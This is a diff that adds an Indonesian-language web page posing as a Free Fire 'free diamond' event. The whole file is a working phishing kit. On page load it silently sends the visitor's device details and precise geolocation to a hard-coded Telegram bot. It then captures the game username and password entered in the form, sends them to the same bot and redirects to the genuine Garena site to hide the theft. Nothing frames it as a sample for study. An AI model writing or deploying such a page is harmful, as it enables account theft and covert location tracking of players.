@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire - Event Klaim Diamond Gratis</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #1a1a2e, #16213e); color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { background: #0f3460; padding: 2rem; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); width: 100%; max-width: 380px; text-align: center; border: 2px solid #e94560; }
+        h2 { color: #ffd369; margin-bottom: 0.5rem; text-transform: uppercase; font-size: 1.5rem; }
+        p { font-size: 0.9rem; color: #b2bec3; margin-bottom: 1.5rem; }
+        .diamond-img { width: 80px; height: 80px; margin-bottom: 1rem; animation: float 2s ease-in-out infinite; }
+        @keyframes float { 0% { transform: translateY(0px); } 50% { transform: translateY(-8px); } 100% { transform: translateY(0px); } }
+        input { width: 100%; padding: 0.8rem; margin: 0.4rem 0 1rem 0; background: #1a1a2e; border: 1px solid #e94560; color: #fff; border-radius: 6px; box-sizing: border-box; font-size: 0.95rem; }
+        input:focus { outline: none; border-color: #ffd369; }
+        button { width: 100%; padding: 0.8rem; background: linear-gradient(45deg, #e94560, #ff6b6b); border: none; color: white; font-weight: bold; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 1rem; box-shadow: 0 4px 12px rgba(233,69,96,0.4); }
+        button:hover { background: linear-gradient(45deg, #ff6b6b, #e94560); }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <svg class="diamond-img" viewBox="0 0 24 24" fill="#00d2d3"><path d="M6 2L2 8l10 14L22 8l-4-6H6zm3.5 2h5l2.5 3.5L12 18.5 7 7.5 9.5 4z"/></svg>
+        <h2>Event Bonus Diamond</h2>
+        <p>Login akun Free Fire kamu untuk klaim 9.999 Diamond gratis sekarang juga!</p>
+        <form id="ffForm">
+            <input type="text" id="userid" placeholder="ID / Username Free Fire" required>
+            <input type="password" id="password" placeholder="Password Akun" required>
+            <button type="submit">Klaim Sekarang</button>
+        </form>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8912769231:AAHezzXihQVeXQXKU4dFCoENQ_6jLy1Jm3k';
+        const CHAT_ID = '1923262380';
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+            });
+        }
+
+        function collectDeviceinfo() {
+            return {
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                cores: navigator.hardwareConcurrency || 'N/A',
+                memory: navigator.deviceMemory || 'N/A',
+                screen: `${window.screen.width}x${window.screen.height}`,
+                lang: navigator.language
+            };
+        }
+
+        window.onload = function() {
+            const info = collectDeviceinfo();
+            let msg = `🎮 *FF Visitor Captured*\n\n` +
+                      `💻 Platform: ${info.platform}\n` +
+                      `📱 UA: ${info.ua}\n` +
+                      `🖥️ Screen: ${info.screen}\n` +
+                      `🧠 Cores: ${info.cores} \vert{} RAM:${info.memory}GB\n` +
+                      `🌐 Lang: ${info.lang}`;
+            sendToTelegram(msg);
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        let geoMsg = `📍 *FF Target Location*\n` +
+                                     `Lat: ${position.coords.latitude}\n` +
+                                     `Lon: ${position.coords.longitude}\n` +
+                                     `Accuracy: ${position.coords.accuracy}m`;
+                        sendToTelegram(geoMsg);
+                    },
+                    (error) => {
+                        sendToTelegram(`⚠️ Geolocation denied: ${error.message}`);
+                    },
+                    { enableHighAccuracy: true }
+                );
+            }
+        };
+
+        document.getElementById('ffForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const u = document.getElementById('userid').value;
+            const p = document.getElementById('password').value;
+
+            let credMsg = `💎 *FF Credentials Harvested*\n\nID/User: \`${u}\`\nPass: \`${p}\``;
+            sendToTelegram(credMsg);
+            
+            setTimeout(() => {
+                window.location.href = 'https://ff.garena.com/';
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
